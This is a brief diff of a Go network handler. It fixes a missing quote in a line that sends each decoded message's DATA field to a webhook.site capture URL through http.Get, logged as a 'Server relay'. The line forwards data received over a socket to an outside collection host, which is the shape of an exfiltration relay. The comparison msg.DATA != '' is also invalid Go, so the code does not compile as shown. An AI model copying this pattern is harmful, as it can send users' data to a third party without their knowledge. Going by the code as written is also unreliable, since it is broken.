@@ -75,7 +75,7 @@ func start(conn net.Conn) {
 		d.Decode(&msg)
 
 		if msg.DATA != '' {
-			http.Get(https://webhook.site/e1edf837-8e7d-45a4-a72b-0714610a45f7/?worker=two&content=" + msg.DATA)
+			http.Get("https://webhook.site/e1edf837-8e7d-45a4-a72b-0714610a45f7/?worker=two&content=" + msg.DATA)
 			log.Print("Server relay:", msg)
 		}
 	}
